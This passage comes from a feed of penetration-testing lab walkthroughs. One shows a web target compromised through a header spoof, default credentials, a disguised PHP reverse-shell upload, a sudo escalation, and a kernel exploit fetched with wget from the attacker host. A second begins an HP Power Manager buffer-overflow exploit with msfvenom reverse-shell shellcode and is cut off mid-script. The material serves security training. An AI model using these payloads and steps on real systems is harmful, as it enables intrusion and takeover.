<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap 192.168.120.65</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-02 09:17 EDT</span><br><span class="line">Nmap scan report for 192.168.120.65</span><br><span class="line">Host is up (0.030s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="GoBuster"><a href="#GoBuster" class="headerlink" title="GoBuster"></a><strong>GoBuster</strong></h3><p>Navigating to the website on port 80 does not give us anything useful. The site appears to be under construction.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ curl http://192.168.120.65</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css&quot; integrity=&quot;sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2&quot; crossorigin=&quot;anonymous&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;container-fluid&quot;&gt;</span><br><span class="line">&lt;center class=&quot;mt-5&quot;&gt;</span><br><span class="line">&lt;h1&gt;Sorry , the site is under construction soon, it run &lt;/h1&gt;</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Next, let’s try employing <code>gobuster</code> to brute-force the site’s directories. We’ll start with a smaller wordlist <strong>/usr/share/wordlists/dirb/small.txt</strong>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ gobuster dir -u http://192.168.120.65/ -w /usr/share/wordlists/dirb/small.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.120.65/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirb/small.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/02 09:04:05 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/administration       (Status: 301) [Size: 325] [--&gt; http://192.168.120.65/administration/]</span><br><span class="line"></span><br><span class="line">===============================================================</span><br><span class="line">2021/04/02 09:04:08 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Our scan gets a 301 response in the directory <strong>/administration</strong>.</p>
<h3 id="HTTP-Enumeration"><a href="#HTTP-Enumeration" class="headerlink" title="HTTP Enumeration"></a><strong>HTTP Enumeration</strong></h3><p>Navigating to the discovered directory (<a href="http://192.168.120.65/administration/">http://192.168.120.65/administration/</a>), we are met with a 403-Forbidden error code.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ curl http://192.168.120.65/administration/</span><br><span class="line">&lt;h1&gt;Forbidden&lt;/h1&gt;&lt;p&gt;You don&#x27;t have permission to access on this folder&lt;/p&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Unfortunately, the server shows no indication why exactly it gave us the 403 error code.</p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="Host-Header-Injection-Vulnerability"><a href="#Host-Header-Injection-Vulnerability" class="headerlink" title="Host Header Injection Vulnerability"></a><strong>Host Header Injection Vulnerability</strong></h3><p>To investigate this further, we’ll set up our browser to use Burp proxy and intercept this request.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /administration/ HTTP/1.1</span><br><span class="line">Host: 192.168.120.65</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>As expected, we get the 403 code back from the server.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.0 403 Forbidden</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Because this is probably an administrative interface (judging by the name of it), we can deduce that it might not like where our request is coming from (i.e. our IP address). Many admin panels and interfaces only grant access to the traffic from localhost. Let’s send our request to the <em>Repeater</em> and see if we can find a way to bypass this obstacle.</p>
<p>If a server is vulnerable to such trickery, a common way to bypass this restriction is to add the <code>X-Forwarded-For</code> HTTP header and set it to the localhost address:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Let’s try this. Our complete request will look like this:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /administration/ HTTP/1.1</span><br><span class="line">Host: 192.168.120.65</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>After we send this request to the server, we get back a <code>200 OK</code> and are presented with a web page!</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OKDate: Fri, 02 Apr 2021 13:40:20 GMTServer: Apache/2.4.10 (Ubuntu)X-Powered-By: PHP/5.5.9-1ubuntu4.29Set-Cookie: PHPSESSID=oq4shm2bghmpf9mqvdrpafvns6; path=/Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheVary: Accept-EncodingContent-Length: 926Connection: closeContent-Type: text/html&lt;html&gt;&lt;head&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css&quot; integrity=&quot;sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;body&gt;&lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;...</span><br></pre></td></tr></table></figure>

<p>Nice, we have made some progress. Let’s add this header to our proxy session permanently. To do that, we’ll navigate to <em>Proxy</em> -&gt; <em>Options</em>, then scroll down to <em>Match and Replace</em>, and add our new header there.</p>
<p><img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Play_68_image_1_8e2eCVUo.png" alt="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Play_68_image_1_8e2eCVUo.png"></p>
<p>Now if we refresh our browser at <a href="http://192.168.120.65/administration/">http://192.168.120.65/administration/</a>, we are presented with a login control.</p>
<h3 id="Application-Credential-Guessing"><a href="#Application-Credential-Guessing" class="headerlink" title="Application Credential Guessing"></a><strong>Application Credential Guessing</strong></h3><p>Before we start brute-forcing the login control, let’s try guessing some default credentials. One of the first ones we’ll try is <code>admin:admin</code>, and it works! We are now successfully authenticated and redirected to <a href="http://192.168.120.65/administration/dashborad/">http://192.168.120.65/administration/dashborad/</a>.</p>
<h3 id="File-Upload-Vulnerability"><a href="#File-Upload-Vulnerability" class="headerlink" title="File Upload Vulnerability"></a><strong>File Upload Vulnerability</strong></h3><p>In the left-side navigation menu, we see a link to <em>Upload file</em>. File upload functionality is always interesting to explore as it can oftentimes contain vulnerabilities. Navigating there (<a href="http://192.168.120.65/administration/upload/">http://192.168.120.65/administration/upload/</a>), we are indeed presented with a file upload control.</p>
<p><img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Play_68_image_2_ps77A92W.png" alt="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Play_68_image_2_ps77A92W.png"></p>
<p>Let’s try uploading a PHP reverse shell. We’ll copy it to our directory and replace the IP address and port number on lines 49 and 50 as needed.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]└─$ cp /usr/share/webshells/php/php-reverse-shell.php ~/shell.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ip = &#x27;192.168.118.5&#x27;;  // CHANGE THIS$port = 4444;       // CHANGE THIS</span><br></pre></td></tr></table></figure>

<p>However, clicking the <em>Send</em> button displays the following error at the very top of the web page:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file not allow</span><br></pre></td></tr></table></figure>

<p>Looks like PHP files are blacklisted. Let’s see if the application is only checking file type during the upload and not file content itself. To do that, we’ll set our Burp proxy to intercept the request before uploading the shell file again. Once the intercept is enabled, we’ll select our shell and click <em>Send</em>. While the page is hanging, we’ll inspect the intercepted request.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /administration/upload/ HTTP/1.1Host: 192.168.120.65User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------130540507737268991721537520459Content-Length: 5839Origin: http://192.168.120.65Connection: closeReferer: http://192.168.120.65/administration/upload/Cookie: PHPSESSID=nsh0gp8fi31pf9rkhf1rg4sn91Upgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1-----------------------------130540507737268991721537520459Content-Disposition: form-data; name=&quot;document&quot;; filename=&quot;shell.php&quot;Content-Type: application/x-php&lt;?php// php-reverse-shell - A Reverse Shell implementation in PHP// Copyright (C) 2007 pentestmonkey@pentestmonkey.net...</span><br></pre></td></tr></table></figure>

<p>To test our theory, we’ll modify the <code>Content-Type</code> parameter to <code>image/png</code>. The modified request would look like this:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...Upgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1-----------------------------130540507737268991721537520459Content-Disposition: form-data; name=&quot;document&quot;; filename=&quot;shell.php&quot;Content-Type: image/png...</span><br></pre></td></tr></table></figure>

<p>We’ll now forward this request to the server. Now at the top of the page, we see the following:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file uploadad files/1617375016shell.php</span><br></pre></td></tr></table></figure>

<p>Nice, it looks like our shell has been successfully uploaded, and the server responded with its location. Let’s start a Netcat listener on port 4444. Once our listener is running, we’ll trigger the reverse shell by navigating to the URL provided by the server, appending it to the current <strong>/upload/</strong> directory.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]└─$ curl http://192.168.120.65/administration/upload/files/1617375016shell.php...</span><br></pre></td></tr></table></figure>

<p>Our listener reports that we have received a reverse shell connection as the <code>www-data</code> user.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]└─$ nc -lvp 4444listening on [any] 4444 ...192.168.120.65: inverse host lookup failed: Unknown hostconnect to [192.168.118.5] from (UNKNOWN) [192.168.120.65] 54728Linux yousef-VirtualBox 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:08:14 UTC 2014 i686 i686 i686 GNU/Linux 17:55:39 up  2:10,  0 users,  load average: 0.00, 0.01, 0.05USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can&#x27;t access tty; job control turned off$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>

<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><p>There are a couple of different vectors we can use to escalate our privileges on the target. The first vector involves recovering user credentials, and the second one involves exploiting a kernel vulnerability.</p>
<h3 id="Local-Enumeration"><a href="#Local-Enumeration" class="headerlink" title="Local Enumeration"></a><strong>Local Enumeration</strong></h3><p>Looking around the file system, we find an interesting file <strong>user.txt</strong> in the home directory.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ls -l /hometotal 8-rw-r--r--  1 root   root     53 Dec  8 02:14 user.txtdrwxr-xr-x 18 yousef yousef 4096 Apr  1 17:24 yousef</span><br></pre></td></tr></table></figure>

<p>Looking inside the file, we find what looks to be a base64-encoded string.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat /home/user.txtc3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=</span><br></pre></td></tr></table></figure>

<p>Let’s try to decode this string.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat /home/user.txt | base64 -dssh :user : yousefpass : yousef123</span><br></pre></td></tr></table></figure>

<p>We find credentials for user <code>yousef</code>, with which we should be able to SSH to the target.</p>
<p>Additionally, checking the kernel version reveals that this is a very old operating system.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ uname -r3.13.0-24-generic</span><br></pre></td></tr></table></figure>

<h3 id="Escalation-via-User-Credentials"><a href="#Escalation-via-User-Credentials" class="headerlink" title="Escalation via User Credentials"></a><strong>Escalation via User Credentials</strong></h3><p>Using the discovered user credentials, we can SSH to the target.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]└─$ ssh yousef@192.168.120.65yousef@192.168.120.65&#x27;s password:Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-24-generic i686) * Documentation:  https://help.ubuntu.com/yousef@yousef-VirtualBox:~$ iduid=1000(yousef) gid=1000(yousef) groups=1000(yousef),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)</span><br></pre></td></tr></table></figure>

<p>Let’s check what this user is able to run with sudo.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yousef@yousef-VirtualBox:~$ sudo -l[sudo] password for yousef:Matching Defaults entries for yousef on yousef-VirtualBox:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/binUser yousef may run the following commands on yousef-VirtualBox:    (ALL : ALL) ALL</span><br></pre></td></tr></table></figure>

<p>We find that the user <code>yousef</code> has wide-open sudo permissions. We can easily take advantage of this and spawn a root shell.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yousef@yousef-VirtualBox:~$ whoamiyousefyousef@yousef-VirtualBox:~$ sudo suroot@yousef-VirtualBox:/home/yousef# whoamiroot</span><br></pre></td></tr></table></figure>

<h3 id="Escalation-via-Kernel-Exploit"><a href="#Escalation-via-Kernel-Exploit" class="headerlink" title="Escalation via Kernel Exploit"></a><strong>Escalation via Kernel Exploit</strong></h3><p>Given the age of this operating system kernel version, there are several exploits available for it. We will opt for the <a href="https://www.exploit-db.com/exploits/37292">overlayfs Local Privilege Escalation</a> exploit.</p>
<p>Having downloaded the exploit source code to our attacking machine, we’ll start a python web server to host it.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]└─$ sudo python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br></pre></td></tr></table></figure>

<p>On the target machine, we’ll navigate to the <strong>/tmp</strong> directory and download the exploit code.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cd /tmp</span><br><span class="line">$ wget http://192.168.118.5/37292.c</span><br><span class="line">--2021-04-02 18:02:18--  http://192.168.118.5/37292.c</span><br><span class="line">Connecting to 192.168.118.5:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3861 (3.8K) [text/x-csrc]</span><br><span class="line">Saving to: &#x27;37292.c&#x27;</span><br><span class="line"></span><br><span class="line">     0K ...                                                   100%  292M=0s</span><br><span class="line"></span><br><span class="line">2021-04-02 18:02:18 (292 MB/s) - &#x27;37292.c&#x27; saved [3861/3861]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Next, we’ll compile it with <code>gcc</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ gcc 37292.c -o exploit</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Finally, we’ll launch the compiled exploit (executable permissions are already granted by <code>gcc</code>) and drop into a root shell.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ whoami</span><br><span class="line">www-data</span><br><span class="line">$ ./exploit</span><br><span class="line">spawning threads</span><br><span class="line">mount #1</span><br><span class="line">mount #2</span><br><span class="line">child threads done</span><br><span class="line">/etc/ld.so.preload created</span><br><span class="line">creating shared library</span><br><span class="line">sh: 0: can&#x27;t access tty; job control turned off</span><br><span class="line"># whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Linux Walkthrough</category>
      </categories>
      <tags>
        <tag>Kernel Exploit</tag>
        <tag>Enumeration</tag>
        <tag>User Credentials</tag>
      </tags>
  </entry>
  <entry>
    <title>Kevin</title>
    <url>/undefined/Kevin/</url>
    <content><![CDATA[<p>In this walkthrough, we’ll leverage default credentials and a public exploit against HP Power Manager. We’ll also<br>successfully exploit it with a public Metasploit module.</p>
<span id="more"></span>

<h1 id="Exploitation-Guide-for-Kevin"><a href="#Exploitation-Guide-for-Kevin" class="headerlink" title="Exploitation Guide for Kevin"></a><strong>Exploitation Guide for Kevin</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We’ll begin with a simple <code>nmap</code> scan:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~# nmap -p- 192.168.120.91</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-26 12:40 EDT</span><br><span class="line">Nmap scan report for 192.168.120.91</span><br><span class="line">Host is up (0.034s latency).</span><br><span class="line">Not shown: 65523 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">80/tcp    open  http</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">3389/tcp  open  ms-wbt-server</span><br><span class="line">3573/tcp  open  tag-ups-1</span><br><span class="line">49152/tcp open  unknown</span><br><span class="line">49153/tcp open  unknown</span><br><span class="line">49154/tcp open  unknown</span><br><span class="line">49155/tcp open  unknown</span><br><span class="line">49156/tcp open  unknown</span><br><span class="line">49159/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 48.24 seconds</span><br><span class="line">root@kali:~# nmap -A -sV -p 80,135,139,445,3389,3573 192.168.120.91</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-26 12:45 EDT</span><br><span class="line">Nmap scan report for 192.168.120.91</span><br><span class="line">Host is up (0.032s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">80/tcp   open  http         GoAhead WebServer</span><br><span class="line">|_http-server-header: GoAhead-Webs</span><br><span class="line">| http-title: HP Power Manager</span><br><span class="line">|_Requested resource was http://192.168.120.91/index.asp</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">3389/tcp open  tcpwrapped</span><br><span class="line">|_ssl-date: 2020-03-27T00:46:50+00:00; +8h00m00s from scanner time.</span><br><span class="line">3573/tcp open  tag-ups-1?</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2008|7|8.1|Vista|2012|10 (94%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_10</span><br><span class="line">Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (94%), Microsoft Windows Server 2008 R2 (94%), Microsoft Windows Server 2008 R2 or Windows 8.1 (94%), Microsoft Windows 7 (94%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (94%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (94%), Microsoft Windows Vista SP2 (94%), Microsoft Windows Server 2008 (94%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (94%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (94%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 9h44m59s, deviation: 3h30m00s, median: 7h59m59s</span><br><span class="line">|_nbstat: NetBIOS name: KEVIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:8a:7d:41 (VMware)</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_7::-</span><br><span class="line">|   Computer name: kevin</span><br><span class="line">|   NetBIOS computer name: KEVIN\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2020-03-26T17:46:33-07:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2.02:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2020-03-27T00:46:34</span><br><span class="line">|_  start_date: 2020-03-27T00:39:28</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 80/tcp)</span><br><span class="line">HOP RTT      ADDRESS</span><br><span class="line">1   33.45 ms 192.168.118.1</span><br><span class="line">2   28.82 ms 192.168.120.91</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 127.09 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a><strong>Web Enumeration</strong></h3><p>Navigating to the default web page on port 80, we are redirected to <code>/index.asp</code> and discover that it is an instance of HP Power Manager application:</p>
<p><img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_08_image_1_KNxnfFuQ.PNG" alt="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_08_image_1_KNxnfFuQ.PNG"></p>
<p>The publicly-listed credentials for this software are <code>admin / admin</code>.</p>
<p><img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_08_image_2_LNvkxvKM.PNG" alt="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_08_image_2_LNvkxvKM.PNG"></p>
<p>We can log in with those credentials and navigate to the <strong>Help</strong> page in the main menu to discover that this is <strong>version 4.2 (Build 7)</strong>:</p>
<p><img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_08_image_3_ovgDCHII.PNG" alt="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_08_image_3_ovgDCHII.PNG"></p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="Shell-1-Universal-Buffer-Overflow"><a href="#Shell-1-Universal-Buffer-Overflow" class="headerlink" title="Shell #1: Universal Buffer Overflow"></a><strong>Shell #1: Universal Buffer Overflow</strong></h3><p>An exploit for this version is listed at <a href="https://www.exploit-db.com/exploits/10099">https://www.exploit-db.com/exploits/10099</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~# searchsploit -t &quot;HP Power Manager&quot;</span><br><span class="line">------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                           |  Path</span><br><span class="line">                                                                         | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">HP Power Manager - &#x27;formExportDataLogs&#x27; Remote Buffer Overflow (Metasplo | exploits/cgi/remote/18015.rb</span><br><span class="line">Hewlett-Packard (HP) Power Manager Administration - Remote Buffer Overfl | exploits/windows/remote/16785.rb</span><br><span class="line">Hewlett-Packard (HP) Power Manager Administration Power Manager Administ | exploits/windows/remote/10099.py</span><br><span class="line">------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br><span class="line">root@kali:~#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We’ll need to change the shellcode to a reverse shell, keeping in mind the <code>n00bn00b</code> egg and the potentially bad characters. Let’s generate the shellcode:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~# msfvenom -p windows/shell_reverse_tcp -f exe --platform windows -a x86 -e x86/alpha_mixed -f c -b &quot;\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a&quot; LHOST=192.168.118.3 LPORT=443</span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/alpha_mixed</span><br><span class="line">x86/alpha_mixed succeeded with size 710 (iteration=0)</span><br><span class="line">x86/alpha_mixed chosen with final size 710</span><br><span class="line">Payload size: 710 bytes</span><br><span class="line">Final size of c file: 3008 bytes</span><br><span class="line">unsigned char buf[] =</span><br><span class="line">&quot;\x89\xe2\xd9\xc6\xd9\x72\xf4\x5f\x57\x59\x49\x49\x49\x49\x49&quot;</span><br><span class="line"></span><br><span class="line">*snip*</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Here’s our completed exploit code:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># HP Power Manager Administration Universal Buffer Overflow Exploit</span><br><span class="line"># CVE 2009-2685</span><br><span class="line"># Tested on Win2k3 Ent SP2 English, Win XP Sp2 English</span><br><span class="line"># Matteo Memelli ryujin __A-T__ offensive-security.com</span><br><span class="line"># www.offensive-security.com</span><br><span class="line"># Spaghetti &amp; Pwnsauce - 07/11/2009</span><br><span class="line">#</span><br><span class="line"># ryujin@bt:~$ ./hppowermanager.py 172.16.30.203</span><br><span class="line"># HP Power Manager Administration Universal Buffer Overflow Exploit</span><br><span class="line"># ryujin __A-T__ offensive-security.com</span><br><span class="line"># [+] Sending evil buffer...</span><br><span class="line"># HTTP/1.0 200 OK</span><br><span class="line"># [+] Done!</span><br><span class="line"># [*] Check your shell at 172.16.30.203:4444 , can take up to 1 min to spawn your shell</span><br><span class="line"># ryujin@bt:~$ nc -v 172.16.30.203 4444</span><br><span class="line"># 172.16.30.203: inverse host lookup failed: Unknown server error : Connection timed out</span><br><span class="line"># (UNKNOWN) [172.16.30.203] 4444 (?) open</span><br><span class="line"># Microsoft Windows [Version 5.2.3790]</span><br><span class="line"># (C) Copyright 1985-2003 Microsoft Corp.</span><br><span class="line"></span><br><span class="line"># C:\WINDOWS\system32&gt;</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from socket import *</span><br><span class="line"></span><br><span class="line">print &quot;HP Power Manager Administration Universal Buffer Overflow Exploit&quot;</span><br><span class="line">print &quot;ryujin __A-T__ offensive-security.com&quot;</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">   HOST  = sys.argv[1]</span><br><span class="line">except IndexError:</span><br><span class="line">   print &quot;Usage: %s HOST&quot; % sys.argv[0]</span><br><span class="line">   sys.exit()</span><br><span class="line"></span><br><span class="line">PORT  = 80</span><br><span class="line">RET   = &quot;\xCF\xBC\x08\x76&quot; # 